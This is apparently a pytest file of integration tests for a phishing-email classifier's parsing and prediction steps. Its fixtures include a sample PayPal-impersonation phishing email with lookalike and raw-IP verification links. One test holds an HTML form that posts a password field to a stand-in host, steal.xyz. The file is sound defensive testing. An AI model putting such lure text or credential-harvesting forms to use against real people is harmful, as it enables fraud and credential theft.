"""
Integration tests for the inference pipeline.

Covers parse_raw_input (email parsing) and run_prediction (end-to-end model).
The model artifact must exist at models/artifacts/best_model.joblib.
"""
import pytest

from app.inference import parse_raw_input, run_prediction


# ── Fixtures ───────────────────────────────────────────────────────────────────

PHISHING_EMAIL = """\
From: security-alert@paypa1-secure.xyz
To: customer@example.com
Subject: URGENT: Your account has been suspended!
Reply-To: collect@evil-harvest.tk

Dear Customer,

URGENT ACTION REQUIRED!! Your PayPal account has been TEMPORARILY SUSPENDED.

Verify now: http://185.220.101.47/paypal/verify?token=a7f3k9xQzP2mR8nB

Click here: http://bit.ly/verify-paypa1-now

PayPal Security Team
"""

HAM_EMAIL = """\
From: newsletter@company.com
To: markus@example.com
Subject: Your weekly project update

Hi Markus,

Here's your weekly update for the Q1 planning project.

Completed this week:
- Finished the onboarding documentation
- Scheduled the kick-off meeting for Thursday

Best,
Sarah
"""


# ── parse_raw_input ────────────────────────────────────────────────────────────

class TestParseRawInput:

    def test_parses_from_header(self):
        result = parse_raw_input(PHISHING_EMAIL)
        assert "paypa1-secure.xyz" in result["sender"]

    def test_parses_subject_header(self):
        result = parse_raw_input(HAM_EMAIL)
        assert "weekly project update" in result["subject"].lower()

    def test_parses_reply_to_header(self):
        result = parse_raw_input(PHISHING_EMAIL)
        assert "evil-harvest.tk" in result["reply_to"]

    def test_body_contains_email_text(self):
        result = parse_raw_input(HAM_EMAIL)
        assert "Markus" in result["body"]

    def test_plain_body_fallback_when_no_headers(self):
        plain = "This is just a plain message with no headers at all."
        result = parse_raw_input(plain)
        assert result["body"] == plain
        assert result["subject"] == ""
        assert result["sender"] == ""

    def test_html_in_plain_body_promoted_to_html_body(self):
        # HTML pasted without MIME wrapping should be detected and promoted
        html_paste = """\
From: spammer@evil.tk
Subject: Confirm details

<html><body><form action="http://steal.xyz/creds">
<input name="pass"><button>Submit</button>
</form></body></html>
"""
        result = parse_raw_input(html_paste)
        assert result["html_body"] != "", "HTML body should be populated from plain body"

    def test_returns_all_required_keys(self):
        result = parse_raw_input(HAM_EMAIL)
        for key in ("subject", "body", "sender", "html_body", "reply_to"):
            assert key in result

    def test_no_exception_on_empty_string(self):
        result = parse_raw_input("")
        assert isinstance(result, dict)

    def test_no_exception_on_malformed_input(self):
        result = parse_raw_input("\x00\xff\xfe broken bytes")
        assert isinstance(result, dict)


# ── run_prediction ─────────────────────────────────────────────────────────────

class TestRunPrediction:

    def test_returns_required_keys(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        for key in ("label", "confidence", "threshold", "raw_features"):
            assert key in result

    def test_label_is_binary(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert result["label"] in (0, 1)

    def test_confidence_in_range(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert 0.0 <= result["confidence"] <= 1.0

    def test_threshold_in_range(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert 0.0 < result["threshold"] < 1.0

    def test_label_consistent_with_confidence_and_threshold(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        expected_label = int(result["confidence"] >= result["threshold"])
        assert result["label"] == expected_label

    def test_raw_features_is_dict(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert isinstance(result["raw_features"], dict)
        assert len(result["raw_features"]) > 0

    def test_phishing_example_classified_as_phishing(self):
        email_dict = parse_raw_input(PHISHING_EMAIL)
        result = run_prediction(email_dict)
        assert result["label"] == 1, (
            f"Expected phishing, got safe (confidence={result['confidence']:.2%})"
        )

    def test_ham_example_classified_as_safe(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert result["label"] == 0, (
            f"Expected safe, got phishing (confidence={result['confidence']:.2%})"
        )

    def test_phishing_high_confidence(self):
        email_dict = parse_raw_input(PHISHING_EMAIL)
        result = run_prediction(email_dict)
        assert result["confidence"] >= 0.85, (
            f"Phishing example confidence too low: {result['confidence']:.2%}"
        )

    def test_ham_low_confidence(self):
        email_dict = parse_raw_input(HAM_EMAIL)
        result = run_prediction(email_dict)
        assert result["confidence"] <= 0.30, (
            f"Ham example phishing confidence too high: {result['confidence']:.2%}"
        )

    def test_prediction_is_deterministic(self):
        email_dict = parse_raw_input(PHISHING_EMAIL)
        r1 = run_prediction(email_dict)
        r2 = run_prediction(email_dict)
        assert r1["confidence"] == r2["confidence"]
        assert r1["label"] == r2["label"]
